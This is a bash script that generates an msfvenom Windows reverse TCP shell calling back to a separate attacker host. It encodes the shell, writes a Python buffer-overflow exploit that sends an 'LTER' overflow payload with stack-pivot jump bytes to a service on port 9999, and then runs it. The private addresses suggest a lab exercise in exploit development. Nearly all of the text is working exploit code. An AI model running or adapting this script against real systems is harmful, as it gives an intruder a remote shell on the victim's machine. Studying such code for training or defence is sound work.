#!/bin/bash

ROOT=$(dirname $(readlink -f ${0}))

echo "Generating payload..."
[ ! -f ${ROOT}/shell ] && msfvenom lport=4444 lhost=192.168.186.133 exitfunc=thread \
        -p windows/shell_reverse_tcp \
        -f raw \
        -e x86/shikata_ga_nai \
        -b '\x00\x01\xff' \
        -o ${ROOT}/shell 2>/dev/null

echo "Building shell-encoded.nasm..."
echo "[BITS 32]" > ${ROOT}/shell-encoded.nasm

echo "Calculating pad..."
PAD_N=$(echo "$(wc -c shell | awk '{print $1}') % 4" | bc | tr -d '\n')
PAD=$(python -c "print('\x47' * (4+${PAD_N}))" | tr -d '\n')

echo "Calling encode.py..."
./encode.py "$(echo -ne "${PAD}" && cat ${ROOT}/shell)" >> ${ROOT}/shell-encoded.nasm

echo "Assembling shell.nasm..."
nasm ${ROOT}/shell-encoded.nasm -o ${ROOT}/shell-encoded

echo "Dumping shell-encoded..."
SHELLCODE=$(/usr/local/bin/hex ${ROOT}/shell-encoded | tail -n +2 | sed -r 's/^\s+//g')

echo "Building exploit.py..."
cat << EOF > exploit.py
#!/usr/bin/env python

import sys
import socket

message  = "LTER "
message += 'A' * 100

buf  = "\x66\x0d\x10\x0e\x50\x5c"  # "or ax,0x0e10 / push eax / pop esp"

${SHELLCODE}

buf += "\x68\x47\x47\x47\x47"
buf += "\x68\x47\x47\x47\x47"
buf += "\x68\x47\x47\x47\x47"
buf += "\x68\x47\x47\x47\x47"

message += buf
message += "A" * (3499-100-len(buf))

message += "\x77\x06\x76\x04"
message += "\x0b\x12\x50\x62"

jump  = "\x51\x58"  # push ecx / pop eax
jump += "\x66\x53"  # push bx
jump += "\x66\x58"  # pop ax
jump += "\x66\x48"  # dec ax
jump += "\x40"  # inc eax
jump += "\x50\x5c"  # push eax / pop esp
jump += "\x48"  # dec eax
jump += "\x66\x2d\x01\x1f"  # sub ax,0x1f01
jump += "\x40"  # inc eax
jump += "\x66\x50"  # push ax
jump += "\x66\x35\x73\x12"  # xor ax,0x1b03

message += jump 
message += 'E' * (4000 - 3499 - 4 - 4 - len(jump))
message += ".\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.186.135", 9999))

s.send(message)
EOF

echo "Cleaning up..."
rm ${ROOT}/{shell,shell-encoded,shell-encoded.nasm}

echo "Executing exploit..."
./exploit.py
